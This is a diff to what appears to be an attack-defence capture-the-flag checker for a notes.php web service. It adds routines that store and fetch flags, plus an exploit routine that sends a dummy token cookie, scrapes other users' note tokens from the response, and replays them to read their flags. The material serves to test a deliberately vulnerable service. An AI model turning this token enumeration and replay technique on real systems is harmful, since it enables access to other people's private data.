@@ -255,6 +255,53 @@ async def getnoise_access_public(
     assert_equals(reconstruct_flag(r.text), secret, "noise not found")
 
 
+@checker.putflag(1)
+async def putflag_test_1(
+    task: PutflagCheckerTaskMessage,
+    logger: LoggerAdapter,
+    client: AsyncClient,
+    db: ChainDB,
+) -> str:
+    r = await client.post("/notes.php", data={
+        "name": "flag",
+        "content": task.flag
+    })
+    token = r.cookies["token"]
+    await db.set("token", token)
+
+
+@checker.getflag(1)
+async def getflag_test_1(
+    task: GetflagCheckerTaskMessage,
+    client: AsyncClient,
+    logger: LoggerAdapter,
+    db: ChainDB,
+) -> None:
+    try:
+        token = await db.get("token")
+    except KeyError:
+        raise MumbleException("Missing database entry from putflag")
+
+    r = await client.get(f"/notes.php?show=flag", cookies={"token": token})
+    assert_in(task.flag, r.text, "flag not found")
+
+
+@checker.exploit(1)
+async def exploit_test_1(
+    task: ExploitCheckerTaskMessage,
+    logger: LoggerAdapter,
+    searcher: FlagSearcher,
+    client: AsyncClient,
+) -> Optional[str]:
+    r = await client.get(f"/notes.php", cookies={"token": "."})
+    matches = re.findall(r"<a href='notes.php\?show=([a-z0-9]+)'>", r.text)
+    matches = reversed(sorted(matches))
+    for t in matches:
+        r = await client.get("/notes.php?show=flag", cookies={"token": t})
+        if flag := searcher.search_flag(r.text):
+            return flag
+
+
 l = 20
 TMPL_NAME = "A" * NAME_LENGTH
 TMPL_LENGTH = 0xFEFEFEFE
